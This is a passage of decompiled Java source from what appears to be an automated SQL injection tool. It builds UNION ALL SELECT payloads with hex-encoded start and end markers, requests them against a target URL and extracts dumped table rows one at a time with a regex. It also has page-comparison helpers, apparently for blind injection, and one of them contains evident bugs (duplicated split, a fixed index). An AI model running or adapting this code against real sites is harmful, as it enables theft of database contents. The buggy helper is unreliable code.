/* 792 */       this.results.append("\nFound " + nbRows + " rows for table " + row.getSchemaName() + "." + row.getTableName());
    }
    else {
/* 795 */       this.results.append("\nCould not find number of rows.\n");
/* 796 */       this.parent.setStatus("Error during exploitation"); return;
    }
    
//    int nbRows = 0;
/* 800 */     for (int i = 0; i < nbRows; i++) {
/* 801 */       query = payload + "UNION ALL SELECT ";
/* 802 */       for (int k = 0; k < this.dispCol - 1; k++)
/* 803 */         query = query + "null,";
/* 804 */       query = query + "concat(0x585858535441525444554D50585858,";
/* 805 */       for (String c : row.getColNames()) {
/* 806 */         query = query.concat(c + ",0x7C7C7C,");
      }
/* 808 */       query = query + "0x585858454E4444554D50585858)";
/* 809 */       for (int k = 0; k < this.nbCols - this.dispCol; k++)
/* 810 */         query = query + ",null";
/* 811 */       query = query + " FROM " + row.getSchemaName() + "." + row.getTableName() + " LIMIT " + i + ",1";
/* 812 */       if ((this.type == 2) || (this.type == 4))
/* 813 */         query = query + "/*";
/* 814 */       testPage = getPageFromUrl(this.url, query, this.method);
/* 815 */       pattern = Pattern.compile("XXXSTARTDUMPXXX((.+?\\x7C\\x7C\\x7C)*(.+?))XXXENDDUMPXXX");
/* 816 */       match = pattern.matcher(testPage);
/* 817 */       if (match.find()) {
/* 818 */         dd.addResult(match.group(1));
      }
    }
  }
  
  public int comparePages(Link page1, Link page2) throws IOException
  {
/* 825 */     String content1 = new Page(page1).getContent();
/* 826 */     String content2 = new Page(page2).getContent();
/* 827 */     String[] tmp1 = content1.split("<[^>]+>");
/* 828 */     String[] tmp2 = content1.split("<[^>]+>");
/* 829 */     int count1 = 0;
/* 830 */     int count2 = 0;
/* 831 */     for (int i = 0; i < tmp1.length; i++) {
/* 832 */       if (content2.indexOf(tmp1[i]) < 0) {
/* 833 */         count1++;
      }
    }
/* 836 */     for (int i = 0; i < tmp2.length; i++) {
/* 837 */       if (content1.indexOf(tmp1[2]) < 0) {
/* 838 */         count2++;
      }
    }
/* 841 */     return Math.max(count1, count2);
  }
  
  public int comparePages(String page1, String page2)
  {
/* 846 */     String[] tmp1 = page1.split("<[^>]+>");
/* 847 */     String[] tmp2 = page2.split("<[^>]+>");
/* 848 */     int count1 = 0;
/* 849 */     int count2 = 0;
/* 850 */     for (int i = 0; i < tmp1.length; i++) {
/* 851 */       if (page2.indexOf(tmp1[i]) < 0) {
/* 852 */         count1++;
      }
    }
/* 855 */     for (int i = 0; i < tmp2.length; i++) {
/* 856 */       if (page1.indexOf(tmp2[i]) < 0) {
/* 857 */         count2++;
      }
    }
    
    return Math.max(count1, count2);
  }
}


